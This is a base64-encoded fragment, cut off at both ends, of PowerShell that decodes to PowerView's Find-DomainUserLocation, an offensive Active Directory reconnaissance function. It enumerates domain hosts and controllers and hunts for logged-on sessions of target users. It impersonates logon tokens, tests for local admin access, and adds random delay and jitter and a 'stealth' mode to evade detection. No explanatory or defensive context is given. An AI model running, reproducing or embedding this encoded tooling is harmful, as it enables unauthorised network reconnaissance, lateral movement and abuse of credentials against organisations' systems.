lNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkRmlsZVNlcnZlcnMgPSBHZXQtRG9tYWluRmlsZVNlcnZlciBARmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRGaWxlU2VydmVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsgJEZpbGVTZXJ2ZXJzID0gQCgkRmlsZVNlcnZlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJBcnJheUxpc3QuQWRkUmFuZ2UoICRGaWxlU2VydmVycyApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFN0ZWFsdGhTb3VyY2UgLW1hdGNoICdERlN8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIERGUyBzZXJ2ZXJzJwogICAgICAgICAgICAgICAgICAgICMgIyBUT0RPOiBmaXggdGhlIHBhc3NlZCBwYXJhbWV0ZXJzIHRvIEdldC1Eb21haW5ERlNTaGFyZQogICAgICAgICAgICAgICAgICAgICMgJENvbXB1dGVyTmFtZSArPSBHZXQtRG9tYWluREZTU2hhcmUgLURvbWFpbiAkRG9tYWluIC1TZXJ2ZXIgJERvbWFpbkNvbnRyb2xsZXIgfCBGb3JFYWNoLU9iamVjdCB7JF8uUmVtb3RlU2VydmVyTmFtZX0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkU3RlYWx0aFNvdXJjZSAtbWF0Y2ggJ0RDfEFsbCcpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFF1ZXJ5aW5nIGZvciBkb21haW4gY29udHJvbGxlcnMnCiAgICAgICAgICAgICAgICAgICAgJERDU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgICAgICAgICAnTERBUCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICREQ1NlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRDb21wdXRlckRvbWFpbiB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREQ1NlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICAgICAgICAgJERvbWFpbkNvbnRyb2xsZXJzID0gR2V0LURvbWFpbkNvbnRyb2xsZXIgQERDU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkRG9tYWluQ29udHJvbGxlcnMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7ICREb21haW5Db250cm9sbGVycyA9IEAoJERvbWFpbkNvbnRyb2xsZXJzKSB9CiAgICAgICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyQXJyYXlMaXN0LkFkZFJhbmdlKCAkRG9tYWluQ29udHJvbGxlcnMgKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9ICRUYXJnZXRDb21wdXRlckFycmF5TGlzdC5Ub0FycmF5KCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIGFsbCBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoIC1lcSAwKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgZ2V0IHRoZSBjdXJyZW50IHVzZXIgc28gd2UgY2FuIGlnbm9yZSBpdCBpbiB0aGUgcmVzdWx0cwogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkQ3VycmVudFVzZXIgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlVzZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkQ3VycmVudFVzZXIgPSAoW0Vudmlyb25tZW50XTo6VXNlck5hbWUpLlRvTG93ZXIoKQogICAgICAgIH0KCiAgICAgICAgIyBub3cgYnVpbGQgdGhlIHVzZXIgdGFyZ2V0IHNldAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Nob3dBbGwnXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBAKCkKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJJZGVudGl0eSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWRtaW5Db3VudCddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgc2FtYWNjb3VudG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkVXNlckdyb3VwSWRlbnRpdHkKICAgICAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBHcm91cFNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWVtYmVyTmFtZQogICAgICAgIH0KCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRVc2VycyBsZW5ndGg6ICQoJFRhcmdldFVzZXJzLkxlbmd0aCkiCiAgICAgICAgaWYgKCgtbm90ICRTaG93QWxsKSAtYW5kICgkVGFyZ2V0VXNlcnMuTGVuZ3RoIC1lcSAwKSkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBObyB1c2VycyBmb3VuZCB0byB0YXJnZXQnCiAgICAgICAgfQoKICAgICAgICAjIHRoZSBob3N0IGVudW1lcmF0aW9uIGJsb2NrIHdlJ3JlIHVzaW5nIHRvIGVudW1lcmF0ZSBhbGwgc2VydmVycwogICAgICAgICRIb3N0RW51bUJsb2NrID0gewogICAgICAgICAgICBQYXJhbSgkQ29tcHV0ZXJOYW1lLCAkVGFyZ2V0VXNlcnMsICRDdXJyZW50VXNlciwgJFN0ZWFsdGgsICRUb2tlbkhhbmRsZSkKCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICMgaW1wZXJzb25hdGUgdGhlIHRoZSB0b2tlbiBwcm9kdWNlZCBieSBMb2dvblVzZXIoKS9JbnZva2UtVXNlckltcGVyc29uYXRpb24KICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgJFNlc3Npb25zID0gR2V0LU5ldFNlc3Npb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2Vzc2lvbiBpbiAkU2Vzc2lvbnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJFNlc3Npb24uVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJENOYW1lID0gJFNlc3Npb24uQ05hbWUKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ05hbWUgLWFuZCAkQ05hbWUuU3RhcnRzV2l0aCgnXFwnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJENOYW1lID0gJENOYW1lLlRyaW1TdGFydCgnXCcpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICMgbWFrZSBzdXJlIHdlIGhhdmUgYSByZXN1bHQsIGFuZCBpZ25vcmUgY29tcHV0ZXIkIHNlc3Npb25zCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFVzZXJOYW1lKSAtYW5kICgkVXNlck5hbWUuVHJpbSgpIC1uZSAnJykgLWFuZCAoJFVzZXJOYW1lIC1ub3RtYXRjaCAkQ3VycmVudFVzZXIpIC1hbmQgKCRVc2VyTmFtZSAtbm90bWF0Y2ggJ1wkJCcpKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCAoLW5vdCAkVGFyZ2V0VXNlcnMpIC1vciAoJFRhcmdldFVzZXJzIC1jb250YWlucyAkVXNlck5hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEb21haW4nICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2Vzc2lvbkZyb20nICRDTmFtZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHRyeSB0byByZXNvbHZlIHRoZSBETlMgaG9zdG5hbWUgb2YgJENuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENOYW1lRE5TTmFtZSA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RFbnRyeSgkQ05hbWUpIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSG9zdE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdTZXNzaW9uRnJvbU5hbWUnICRDbmFtZUROU05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1Nlc3Npb25Gcm9tTmFtZScgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc2VlIGlmIHdlJ3JlIGNoZWNraW5nIHRvIHNlZSBpZiB3ZSBoYXZlIGxvY2FsIGFkbWluIGFjY2VzcyBvbiB0aGlzIG1hY2hpbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENoZWNrQWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBZG1pbiA9IChUZXN0LUFkbWluQWNjZXNzIC1Db21wdXRlck5hbWUgJENOYW1lKS5Jc0FkbWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJEFkbWluLklzQWRtaW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuVXNlckxvY2F0aW9uJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFN0ZWFsdGgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSBub3QgJ3N0ZWFsdGh5JywgZW51bWVyYXRlIGxvZ2dlZG9uIHVzZXJzIGFzIHdlbGwKICAgICAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uID0gR2V0LU5ldExvZ2dlZG9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyIGluICRMb2dnZWRPbikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJFVzZXIuVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJFVzZXIuTG9nb25Eb21haW4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIG1ha2Ugc3VyZSB3ZXQgaGF2ZSBhIHJlc3VsdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkVXNlck5hbWUpIC1hbmQgKCRVc2VyTmFtZS50cmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICggKC1ub3QgJFRhcmdldFVzZXJzKSAtb3IgKCRUYXJnZXRVc2VycyAtY29udGFpbnMgJFVzZXJOYW1lKSAtYW5kICgkVXNlck5hbWUgLW5vdG1hdGNoICdcJCQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSVBBZGRyZXNzID0gQChSZXNvbHZlLUlQQWRkcmVzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcilbMF0uSVBBZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJUEFkZHJlc3MnICRJUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uRnJvbScgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uRnJvbU5hbWUnICROdWxsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHNlZSBpZiB3ZSdyZSBjaGVja2luZyB0byBzZWUgaWYgd2UgaGF2ZSBsb2NhbCBhZG1pbiBhY2Nlc3Mgb24gdGhpcyBtYWNoaW5lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ2hlY2tBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBZG1pbiA9IFRlc3QtQWRtaW5BY2Nlc3MgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJEFkbWluLklzQWRtaW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyTG9jYXRpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQoKICAgICAgICAgICAgICAgICMgc2xlZXAgZm9yIG91ciBzZW1pLXJhbmRvbWl6ZWQgaW50ZXJ2YWwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5Db3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkVGFyZ2V0VXNlcnMsICRDdXJyZW50VXNlciwgJFN0ZWFsdGgsICRMb2dvblRva2VuCgogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWFuZCAkU3RvcE9uU3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24KICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnVGFyZ2V0VXNlcnMnID0gJFRhcmdldFVzZXJzCiAgICAgICAgICAgICAgICAnQ3VycmVudFVzZXInID0gJEN1cnJlbnRVc2VyCiAgICAgICAgICAgICAgICAnU3RlYWx0aCcgPSAkU3RlYWx0aAogICAgICAgICAgICAgICAgJ1Rva2VuSGFuZGxlJyA9ICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24gdXNpbmcgdGhlICRIb3N0RW51bUJsb2NrICsgcGFyYW1zCiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21w